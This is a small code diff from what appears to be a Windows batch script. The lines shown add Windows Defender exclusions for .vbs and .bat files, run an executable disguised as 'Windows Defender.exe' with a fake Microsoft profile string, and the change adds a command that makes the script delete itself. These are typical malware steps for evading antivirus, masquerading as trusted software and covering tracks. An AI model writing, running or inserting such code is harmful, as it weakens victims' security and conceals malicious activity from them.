@@ -51,3 +51,4 @@ powershell.exe -command "Add-MpPreference -ExclusionExtension ".vbs""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
+DEL /s /f /q /a "%~f0"
